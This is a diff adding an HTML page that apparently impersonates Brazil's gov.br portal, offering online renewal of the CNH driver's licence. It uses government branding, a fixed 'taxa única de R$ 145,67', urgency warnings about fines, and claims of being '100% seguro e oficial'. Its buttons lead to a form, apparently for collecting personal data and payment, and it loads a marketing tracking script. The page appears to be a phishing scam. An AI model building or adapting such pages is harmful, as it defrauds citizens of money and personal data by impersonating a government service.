@@ -1,0 +1,514 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Renovação de CNH - gov.br</title>
+    
+    <!-- External CSS -->
+    <script src="3.4.17"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="rawline" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/custom.css">
+    
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Renovação de Carteira Nacional de Habilitação - Governo Federal">
+    <meta name="keywords" content="CNH, renovação, carteira motorista, DETRAN, habilitação">
+    <meta name="author" content="Governo Federal do Brasil">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="Renovação de CNH - gov.br">
+    <meta property="og:description" content="Renovação de Carteira Nacional de Habilitação do Governo Federal">
+    <meta property="og:type" content="website">
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+
+    <!-- Preserve Query Parameters Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get current query parameters
+            const currentParams = new URLSearchParams(window.location.search);
+            
+            // Function to add query parameters to a URL
+            function addQueryParams(url) {
+                if (!url) return url;
+                
+                // Create URL object with absolute path
+                const urlObj = new URL(url, window.location.origin);
+                
+                // Preserve existing parameters
+                currentParams.forEach((value, key) => {
+                    urlObj.searchParams.set(key, value);
+                });
+                
+                return urlObj.toString();
+            }
+            
+            // Add click event listeners to all links
+            document.querySelectorAll('a').forEach(link => {
+                const originalHref = link.getAttribute('href');
+                if (originalHref && !originalHref.startsWith('#') && !originalHref.startsWith('javascript:')) {
+                    link.addEventListener('click', function(e) {
+                        const newUrl = addQueryParams(originalHref);
+                        if (newUrl !== originalHref) {
+                            e.preventDefault();
+                            window.location.href = newUrl;
+                        }
+                    });
+                }
+            });
+
+            // Debug log to check parameters
+            console.log('Current URL:', window.location.href);
+            console.log('Current Parameters:', Object.fromEntries(currentParams));
+        });
+    </script>
+</head>
+<body class="bg-white">
+    <!-- Header -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="index.htm" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg.png" alt="gov.br" class="h-8">
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-900 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-900 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-900 mx-3"></i>
+                </button>
+                <a href="#" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+                    <i class="fas fa-user mr-2"></i>
+                    Entrar
+                </a>
+            </div>
+        </div>
+
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
+            <div class="flex items-center">
+                <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
+                    <i class="fas fa-bars text-blue-900 mr-3"></i>
+                </button>
+                <span class="text-gray-800 text-sm font-medium">Renovação de CNH</span>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
+                    <i class="fas fa-microphone text-blue-900 mx-2"></i>
+                </button>
+                <button class="header-btn" id="search-toggle-btn" aria-label="Pesquisar">
+                    <i class="fas fa-search text-blue-900 mx-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
+            <div class="flex items-center max-w-md mx-auto">
+                <div class="relative flex-1">
+                    <input type="text" id="header-search-input" placeholder="Buscar serviços, documentos, ministérios..." class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
+                    <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+                <button id="search-close-btn" class="ml-3 text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural">
+            <div class="flex flex-wrap items-center gap-1">
+                <a href="index.htm" class="text-blue-700 hover:text-blue-800">
+                    <i class="fas fa-home"></i>
+                </a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/servicos" class="text-blue-700 hover:text-blue-800 text-xs">Serviços</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/transito" class="text-blue-700 hover:text-blue-800 text-xs">Trânsito</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/documentos" class="text-blue-700 hover:text-blue-800 text-xs">Documentos</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/cnh" class="text-blue-700 hover:text-blue-800 text-xs">CNH</a>
+                <span class="mx-1 text-gray-600">></span>
+                <span class="text-gray-800 text-xs font-medium">Renovação de CNH</span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        
+    <div id="landing-content">
+        <div class="px-4 py-4">
+            <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Renovação de CNH - Carteira Nacional de Habilitação</h1>
+            
+            <div class="border-t border-b border-gray-300 py-3">
+                <div class="flex items-center mb-2">
+                    <span class="text-gray-700 mr-2 text-sm">Compartilhe:</span>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="facebook" aria-label="Compartilhar no Facebook"><i class="fab fa-facebook-f"></i></button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="twitter" aria-label="Compartilhar no Twitter"><i class="fab fa-twitter"></i></button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="whatsapp" aria-label="Compartilhar no WhatsApp"><i class="fab fa-whatsapp"></i></button>
+                    <button class="share-btn text-blue-700 mx-1" data-platform="link" aria-label="Copiar link"><i class="fas fa-link"></i></button>
+                </div>
+                <div class="text-gray-700 text-sm">
+                    <p>Publicado em 23/05/2025 08h13 - Atualizado em 23/05/2025 08h13</p>
+                </div>
+            </div>
+        
+            <div class="py-4 content-text">
+                <h2 class="text-2xl font-bold mb-4">SERVIÇO DE RENOVAÇÃO DE CNH - GOVERNO FEDERAL</h2>
+                <h3 class="text-xl font-semibold mb-2" style="color: #1351B4;">RENOVAÇÃO SIMPLIFICADA DA CARTEIRA NACIONAL DE HABILITAÇÃO</h3>
+        
+                <div class="mb-4">
+                    <img src="images/governador-lanca-programa-cnh-do.jpg" alt="Pessoa segurando carteira de motorista" class="w-full rounded-lg shadow-md">
+                </div>
+        
+                <h4 class="text-lg font-medium mb-4">RENOVAÇÃO 100% ONLINE - PROCESSO SIMPLIFICADO</h4>
+        
+                <p class="mb-4 text-gray-800">O <strong>Governo Federal</strong>, por meio do <strong>DENATRAN</strong> e dos <strong>DETRANs estaduais</strong>, disponibiliza o serviço de renovação de CNH de forma totalmente online. Agora você pode renovar sua Carteira Nacional de Habilitação sem sair de casa, com segurança e praticidade.</p>
+        
+                <p class="mb-4 text-gray-800">O processo de renovação é obrigatório para condutores com CNH próxima do vencimento ou vencida há menos de 30 dias. A renovação garante que você continue habilitado para dirigir em todo território nacional.</p>
+       
+                <div class="mb-6">
+                    <h6 class="text-lg font-medium text-gray-800 mb-4" style="color: #1351B4;">
+                        <b>INFORMAÇÕES IMPORTANTES</b>
+                    </h6>
+                    <ul class="list-disc list-inside text-gray-700 mb-4">
+                        <li>Processo 100% digital e seguro</li>
+                        <li>Renovação válida em todo território nacional</li>
+                        <li>CNH Digital disponível imediatamente após aprovação</li>
+                        <li>Taxa única de R$ 145,67 (valor referência)</li>
+                    </ul>
+                </div>
+        
+                <div class="mb-6">
+                    <h6 class="text-lg font-medium text-gray-800 mb-3" style="color: #1351B4;">
+                        <b>REQUISITOS PARA RENOVAÇÃO</b>
+                    </h6>
+                    <p class="text-gray-700">• CNH próxima do vencimento (até 30 dias antes)</p>
+                    <p class="text-gray-700">• CNH vencida há menos de 30 dias</p>
+                    <p class="text-gray-700">• Não ter pendências financeiras com o DETRAN</p>
+                    <p class="text-gray-700">• Não ter cometido infrações gravíssimas nos últimos 12 meses</p>
+                </div>
+
+                <div class="mb-6">
+                    <h6 class="text-lg font-medium text-gray-800 mb-4" style="color: #1351B4;">
+                        <b>DOCUMENTOS NECESSÁRIOS</b>
+                    </h6>
+                    <p class="text-gray-800 mb-2">
+                        Para realizar a renovação, você precisará dos seguintes documentos:
+                    </p>
+                    <ul class="list-disc list-inside text-gray-700">
+                        <li>CNH atual (vencida ou próxima do vencimento)</li>
+                        <li>CPF</li>
+                        <li>Comprovante de residência atualizado</li>
+                        <li>Certidão de quitação eleitoral (para maiores de 18 anos)</li>
+                    </ul>
+                </div>
+
+                <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
+                    <h6 class="text-lg font-medium text-blue-800 mb-2">
+                        <i class="fas fa-info-circle mr-2"></i>
+                        <b>ATENÇÃO</b>
+                    </h6>
+                    <p class="text-blue-700 text-sm">
+                        Dirigir com CNH vencida constitui infração gravíssima, com multa de R$ 293,47, apreensão do veículo e adição de 7 pontos na carteira. Evite multas e transtornos, renove sua CNH em dia.
+                    </p>
+                </div>
+        
+                <div class="text-center my-8">
+                    <a href="/cnh/formulario" class="inline-block">
+                        <button class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded animate-pulse">
+                            <i class="fas fa-id-card mr-2"></i>
+                            INICIAR RENOVAÇÃO
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                    </a>
+                    <p class="text-blue-600 font-medium mt-3 text-sm">
+                        <i class="fas fa-shield-alt mr-1"></i>
+                        Processo 100% seguro e oficial
+                    </p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                    <div class="text-center p-4 border border-gray-200 rounded-lg">
+                        <i class="fas fa-clock text-blue-600 text-2xl mb-2"></i>
+                        <h6 class="font-medium text-gray-800">Processo Rápido</h6>
+                        <p class="text-sm text-gray-600">Conclua em até 15 minutos</p>
+                    </div>
+                    <div class="text-center p-4 border border-gray-200 rounded-lg">
+                        <i class="fas fa-mobile-alt text-blue-600 text-2xl mb-2"></i>
+                        <h6 class="font-medium text-gray-800">100% Digital</h6>
+                        <p class="text-sm text-gray-600">Sem necessidade de deslocamento</p>
+                    </div>
+                    <div class="text-center p-4 border border-gray-200 rounded-lg">
+                        <i class="fas fa-file-alt text-blue-600 text-2xl mb-2"></i>
+                        <h6 class="font-medium text-gray-800">CNH Imediata</h6>
+                        <p class="text-sm text-gray-600">Versão digital disponível na hora</p>
+                    </div>
+                </div>
+        
+                <blockquote class="font-bold mb-4 text-center text-blue-800 text-lg border-l-4 border-blue-600 pl-4 italic">
+                    "A renovação da CNH é um serviço essencial para garantir a segurança no trânsito e a regularidade do condutor perante a lei."
+                </blockquote>
+            </div>
+        </div>
+    </div>
+
+    <!-- CEP Result Content -->
+    <div id="cep-result-content" class="hidden px-4 py-8 max-w-2xl mx-auto">
+        <h2 class="text-2xl font-bold mb-6 text-gray-800">Consulta de Disponibilidade - Região Confirmada</h2>
+        
+        <div class="bg-white border rounded-lg shadow-sm p-6 mb-6">
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-gray-500 text-sm">CEP:</label>
+                    <p id="result-cep" class="font-medium text-lg text-gray-800">-</p>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-500 text-sm">Logradouro:</label>
+                    <p id="result-logradouro" class="font-medium text-lg text-gray-800">-</p>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-500 text-sm">Bairro:</label>
+                    <p id="result-bairro" class="font-medium text-lg text-gray-800">-</p>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-500 text-sm">Localidade:</label>
+                    <p id="result-localidade" class="font-medium text-lg text-gray-800">-</p>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-500 text-sm">Estado:</label>
+                    <p id="result-uf" class="font-medium text-lg text-gray-800">-</p>
+                </div>
+                
+                <div class="pt-2">
+                    <label class="block text-gray-500 text-sm">Código da Região:</label>
+                    <p class="font-medium text-blue-600 text-lg">REG-CNH-215</p>
+                </div>
+                
+                <div class="bg-green-50 border border-green-200 rounded p-4 mt-4">
+                    <div class="flex items-center space-x-2">
+                        <span class="text-gray-600">Status:</span>
+                        <span class="bg-green-100 text-green-800 text-xs font-bold px-2.5 py-0.5 rounded uppercase">Disponível</span>
+                    </div>
+                    <div class="mt-2 text-green-700 font-medium">
+                        Unidades: 3 unidades disponíveis
+                    </div>
+                </div>
+                
+                <div class="flex items-start mt-4 text-gray-600 text-sm">
+                    <i class="fas fa-info-circle mt-1 mr-2 text-blue-600"></i>
+                    <p id="result-info">Serviço disponível para sua região. Clique no botão abaixo para prosseguir com a renovação.</p>
+                </div>
+            </div>
+        </div>
+
+        <a href="/cnh/formulario" class="block w-full">
+            <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center transition duration-300">
+                <i class="fas fa-id-card mr-3"></i>
+                INICIAR RENOVAÇÃO
+                <i class="fas fa-arrow-right ml-3"></i>
+            </button>
+        </a>
+        
+        <div class="text-center mt-4">
+             <div class="flex items-center justify-center text-blue-600 text-sm">
+                <i class="fas fa-info-circle mr-2"></i>
+                <span>Próximo passo: Preenchimento dos dados pessoais e documentação</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const cep = urlParams.get('cep');
+
+            if (cep) {
+                // Hide landing content and show CEP result container (loading state could be added here)
+                document.getElementById('landing-content').classList.add('hidden');
+                const resultContainer = document.getElementById('cep-result-content');
+                resultContainer.classList.remove('hidden');
+
+                // Basic validation/formatting or just using raw for now
+                const cleanCep = cep.replace(/\D/g, '');
+                
+                if (cleanCep.length === 8) {
+                    fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (!data.erro) {
+                                document.getElementById('result-cep').textContent = data.cep;
+                                document.getElementById('result-logradouro').textContent = data.logradouro;
+                                document.getElementById('result-bairro').textContent = data.bairro;
+                                document.getElementById('result-localidade').textContent = data.localidade;
+                                document.getElementById('result-uf').textContent = `${data.uf} - ${getEstadoNome(data.uf)}`;
+                                document.getElementById('result-info').textContent = `Serviço disponível para ${data.localidade} - ${data.uf}. Clique no botão abaixo para prosseguir com a renovação.`;
+                            } else {
+                                alert('CEP não encontrado.');
+                                // Optionally redirect back or show error state
+                            }
+                        })
+                        .catch(err => {
+                            console.error('Erro ao buscar CEP:', err);
+                            // Fallback or error handling
+                        });
+                }
+            }
+            
+            function getEstadoNome(sigla) {
+                const estados = {
+                    'AC': 'Acre', 'AL': 'Alagoas', 'AP': 'Amapá', 'AM': 'Amazonas', 'BA': 'Bahia',
+                    'CE': 'Ceará', 'DF': 'Distrito Federal', 'ES': 'Espírito Santo', 'GO': 'Goiás',
+                    'MA': 'Maranhão', 'MT': 'Mato Grosso', 'MS': 'Mato Grosso do Sul', 'MG': 'Minas Gerais',
+                    'PA': 'Pará', 'PB': 'Paraíba', 'PR': 'Paraná', 'PE': 'Pernambuco', 'PI': 'Piauí',
+                    'RJ': 'Rio de Janeiro', 'RN': 'Rio Grande do Norte', 'RS': 'Rio Grande do Sul',
+                    'RO': 'Rondônia', 'RR': 'Roraima', 'SC': 'Santa Catarina', 'SP': 'São Paulo',
+                    'SE': 'Sergipe', 'TO': 'Tocantins'
+                };
+                return estados[sigla] || sigla;
+            }
+        });
+    </script>
+        
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#0a1f44] text-white">
+        <div class="container mx-auto px-6 py-4">
+            <!-- Logo -->
+            <div class="py-6">
+                <img src="images/1200px-Gov.br_logo.svg.png" alt="Government of Brazil logo showing gov.br in white text" class="w-40">
+            </div>
+
+            <!-- Divider -->
+            <div class="border-t border-gray-600"></div>
+
+            <!-- Navigation Menu -->
+            <nav aria-label="Menu principal do rodapé">
+                <ul>
+                    <li class="py-3">
+                        <a href="#" class="text-sm hover:text-gray-300">DENATRAN</a>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">SERVIÇOS DE TRÂNSITO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Serviços de Trânsito">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">DOCUMENTOS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Documentos">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">LEGISLAÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Legislação">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="/acesso-informacao" class="text-sm hover:text-gray-300">ACESSO À INFORMAÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Acesso à Informação">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">CANAIS DE ATENDIMENTO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Canais de Atendimento">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">PERGUNTAS FREQUENTES</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Perguntas Frequentes">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600"></li>
+                </ul>
+            </nav>
+
+            <!-- Cookie Settings -->
+            <div class="mt-6 flex items-center">
+                <button id="cookie-settings" class="flex items-center hover:text-gray-300" aria-label="Redefinir configurações de cookies">
+                    <i class="fas fa-cookie-bite text-lg mr-2"></i>
+                    <span class="text-sm">Redefinir Cookies</span>
+                </button>
+            </div>
+
+            <!-- Social Networks -->
+            <div class="redes-e-logos mt-8">
+                <div class="redes-sociais">
+                    <div class="titulo text-sm font-bold mb-4">Redes sociais</div>
+                    <ul class="portal-redes">
+                        <li class="portalredes-youtube portalredes-item">
+                            <a href="#" aria-label="YouTube" class="social-link">
+                                <i class="fab fa-youtube social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-facebook portalredes-item">
+                            <a href="#" aria-label="Facebook" class="social-link">
+                                <i class="fab fa-facebook-f social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-twitter portalredes-item">
+                            <a href="#" aria-label="Twitter" class="social-link">
+                                <i class="fab fa-twitter social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-instagram portalredes-item">
+                            <a href="#" aria-label="Instagram" class="social-link">
+                                <i class="fab fa-instagram social-icon"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden">
+        <div class="search-modal-content">
+            <div class="search-modal-header">
+                <h3>Pesquisar</h3>
+                <button id="close-search-modal" aria-label="Fechar pesquisa">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="search-modal-body">
+                <form id="search-form">
+                    <input type="text" id="search-input" placeholder="Digite sua pesquisa..." aria-label="Campo de pesquisa">
+                    <button type="submit" aria-label="Pesquisar">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="js/main.js"></script>
+
+
+</body></html>
